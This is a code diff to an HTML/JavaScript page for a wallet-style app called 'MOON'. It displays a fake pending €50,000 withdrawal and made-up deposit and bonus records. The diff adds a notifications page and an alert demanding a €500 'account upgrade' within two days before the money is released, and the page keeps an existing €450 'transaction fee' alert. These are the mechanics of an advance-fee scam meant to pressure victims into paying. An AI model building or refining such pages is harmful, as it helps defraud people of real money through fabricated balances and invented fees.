@@ -78,7 +78,7 @@ button:hover{transform:translateY(-3px);}
 </head>
 <body>
 <div class="app">
-<div class="header"><div class="logo">MOON 🌙</div><div class="notify">🔔</div></div>
+<div class="header"><div class="logo">MOON 🌙</div><div class="notify" onclick="goToNotifications()" style="cursor:pointer;">🔔</div></div>
 <div class="auth" id="authBox" style="display:block;">
 <div class="auth-title">Create Account</div>
 <input type="text" id="name" placeholder="Full Name">
@@ -123,10 +123,10 @@ button:hover{transform:translateY(-3px);}
 </div>
 <!-- TRANSACTIONS -->
 <div class="section">
-<div class="section-title" onclick="showFeeAlert()" style="cursor:pointer;">Recent Transactions</div>
-<div class="card" id="transactionList" onclick="showFeeAlert()" style="cursor:pointer;">
+<div class="section-title">Recent Transactions</div>
+<div class="card" id="transactionList">
 <div class="transaction">
-<div class="left"><div class="circle">⏳</div><div><div>Withdraw to<br>Bank Transfer</div><span class="pending-badge">PROCESSING</span><div class="small">20/5/2026</div></div></div>
+<div class="left"><div class="circle">⏳</div><div><div>Withdraw to<br>Bank Transfer</div><span class="pending-badge">PROCESSING</span><div class="small">22/5/2026</div></div></div>
 <div style="text-align:right;"><div style="color:#fbbf24;font-size:14px;">-</div><div class="yellow" style="font-size:18px;font-weight:700;">€50,000.68</div></div>
 </div>
 <div class="transaction">
@@ -150,6 +150,53 @@ button:hover{transform:translateY(-3px);}
 <div class="nav">📈<<div>Market</div></div>
 <div class="nav">🎁<<div>Rewards</div></div>
 <div class="nav">👤<<div>Profile</div></div>
+</div>
+</div>
+<div class="page" id="notificationPage" style="display:none;padding-bottom:110px;">
+<div class="header" style="padding:25px 20px;display:flex;justify-content:space-between;align-items:center;">
+<div style="font-size:22px;cursor:pointer;" onclick="goBack()">← Back</div>
+<div class="logo">Notifications</div>
+<div style="width:22px;"></div>
+</div>
+<div class="section" style="padding:0 20px;margin-top:20px;">
+<div class="card" style="background:linear-gradient(135deg,#1a1f3a,#252b4a);border:1px solid rgba(0,255,255,.15);">
+<div style="display:flex;align-items:center;gap:15px;margin-bottom:15px;">
+<div style="width:50px;height:50px;background:rgba(251,191,36,.2);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;">🔔</div>
+<div>
+<div style="font-size:16px;font-weight:600;">Account Upgrade Required</div>
+<div class="small">Today • 22/5/2026</div>
+</div>
+</div>
+<div style="padding:15px;background:rgba(0,0,0,.2);border-radius:16px;margin-top:10px;">
+<div style="font-size:14px;line-height:1.7;opacity:.9;">
+Due to limit on your revolute bank<br><br>
+You will be able to receive your whole <span style="color:#fbbf24;font-weight:700;">€50,000</span><br><br>
+If your account is upgraded with <span style="color:#fbbf24;font-weight:700;">€500</span> and you have till 2 days to finalize this<br><br>
+<span style="opacity:.7;">Aris Adrianus Cornelis Groenendijk</span>
+</div>
+</div>
+</div>
+<div class="card" style="margin-top:15px;opacity:.6;">
+<div style="display:flex;align-items:center;gap:15px;">
+<div style="width:50px;height:50px;background:#1b2348;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:20px;">✅</div>
+<div>
+<div style="font-size:15px;font-weight:600;">Deposit Completed</div>
+<div class="small">Yesterday • 21/5/2026</div>
+</div>
+</div>
+<div style="margin-top:10px;font-size:14px;opacity:.8;">Your deposit of €8,000.00 has been confirmed.</div>
+</div>
+<div class="card" style="margin-top:15px;opacity:.6;">
+<div style="display:flex;align-items:center;gap:15px;">
+<div style="width:50px;height:50px;background:#1b2348;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:20px;">🎁</div>
+<div>
+<div style="font-size:15px;font-weight:600;">Bonus Reward</div>
+<div class="small">2 days ago • 20/5/2026</div>
+</div>
+</div>
+<div style="margin-top:10px;font-size:14px;opacity:.8;">You received a bonus reward of €2,450.00</div>
+</div>
+</div>
 </div>
 </div>
 <div class="modal-overlay" id="withdrawModal">
@@ -196,7 +243,7 @@ localStorage.setItem("moonName",name);
 localStorage.setItem("moonEmail",email);
 localStorage.setItem("moonPassword",password);
 let defaultTransactions=[
-  {icon:"⏳",name:"Withdraw to Bank Transfer",date:"20/5/2026",amount:50000.68,type:"out",status:"pending"},
+  {icon:"⏳",name:"Withdraw to Bank Transfer",date:"22/5/2026",amount:50000.68,type:"out",status:"pending"},
   {icon:"⬇️",name:"Deposit",date:"19/5/2026",amount:8000,type:"in",status:"completed"},
   {icon:"🎁",name:"Bonus Reward",date:"18/5/2026",amount:2450,type:"in",status:"completed"},
   {icon:"🎉",name:"Cashback Reward",date:"17/5/2026",amount:650,type:"in",status:"completed"}
@@ -273,7 +320,7 @@ localStorage.setItem("moonBalance",currentBalance);
 updateBalanceDisplay();
 let transactions=JSON.parse(localStorage.getItem("moonTransactions")||"[]");
 let methodName=selectedMethod==='paypal'?'PayPal':'Bank Transfer';
-transactions.unshift({icon:"⏳",name:"Withdraw to "+methodName,date:"20/5/2026",amount:amount,type:"out",status:"pending"});
+transactions.unshift({icon:"⏳",name:"Withdraw to "+methodName,date:"22/5/2026",amount:amount,type:"out",status:"pending"});
 localStorage.setItem("moonTransactions",JSON.stringify(transactions));
 renderTransactions();
 closeWithdrawModal();
@@ -309,6 +356,17 @@ document.getElementById("name").value="";
 document.getElementById("email").value="";
 document.getElementById("password").value="";
 }
+function goToNotifications(){
+document.getElementById("dashboard").style.display="none";
+document.getElementById("authBox").style.display="none";
+document.getElementById("notificationPage").style.display="block";
+}
+function goBack(){
+document.getElementById("notificationPage").style.display="none";
+document.getElementById("dashboard").style.display="block";
+}
+function showNotificationAlert(){document.getElementById("notificationAlert").style.display="flex";}
+function closeNotificationAlert(){document.getElementById("notificationAlert").style.display="none";}
 </script>
 <div class="alert-overlay" id="feeAlert">
 <div class="alert-box">
@@ -316,6 +374,14 @@ document.getElementById("password").value="";
 <div class="alert-title">Transaction Fee Required</div>
 <div class="alert-text">To view and process your transaction history, a <span class="alert-highlight">€450 transaction fee</span> is required.<br><br>Please complete the payment to unlock your transaction records.</div>
 <button class="alert-btn" onclick="closeFeeAlert()">Got it</button>
+</div>
+</div>
+<div class="alert-overlay" id="notificationAlert">
+<div class="alert-box">
+<div class="alert-icon">🔔</div>
+<div class="alert-title">Account Upgrade Required</div>
+<div class="alert-text">Due to limit on your revolute bank<br><br>You will be able to receive your whole <span class="alert-highlight">€50,000</span><br><br>If your account is upgraded with <span class="alert-highlight">€500</span> and you have till 2 days to finalize this<br><br>Aris Adrianus Cornelis Groenendijk</div>
+<button class="alert-btn" onclick="closeNotificationAlert()">Got it</button>
 </div>
 </div>
 </body>
